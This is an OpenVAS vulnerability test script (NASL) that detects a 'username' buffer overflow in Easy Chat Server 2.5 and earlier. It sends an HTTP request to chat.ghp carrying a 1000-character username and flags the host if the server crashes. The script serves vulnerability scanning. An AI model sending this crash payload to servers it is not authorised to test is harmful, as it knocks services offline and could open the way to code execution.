###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_easy_chat_server_username_bof.nasl 13 2013-10-27 12:16:33Z jan $
#
# Easy Chat Server 'username' Buffer Overflow Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote attackers to execute arbitrary
  code on the system or cause the application to crash.
  Impact Level: System/Application";
tag_affected = "Easy Chat Server Version 2.5 and before.";
tag_insight = "The flaw is due to a boundary error when processing URL parameters.
  Which can be exploited to cause a buffer overflow by sending an overly long
  'username' parameter to 'chat.ghp' script.";
tag_solution = "No solution or patch is available as of 24th August, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.echatserver.com/";
tag_summary = "This host is installed with Easy Chat Server and is prone to
  Buffer overflow vulnerability.";

if(description)
{
  script_id(901201);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-25 09:25:35 +0200 (Thu, 25 Aug 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("Easy Chat Server 'username' Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/519257");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Aug/109");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/104016");

  script_description(desc);
  script_summary("Check for the vulnerable version of Easy Chat Server");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_dependencies("find_service.nasl");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Easy Chat Server" >!< banner){
  exit(0);
}

## Construct and Send Malicious Request
url = "/chat.ghp?username=" + crap(data:"A", length:1000) +
                              "&password=null&room=1&null=2";
req = http_get(item:url, port:port);
res = http_send_recv(port:port, data:req);

## Confirm the Easy Chat Server is dead or alive
if(http_is_dead(port:port)){
  security_hole(port);
}
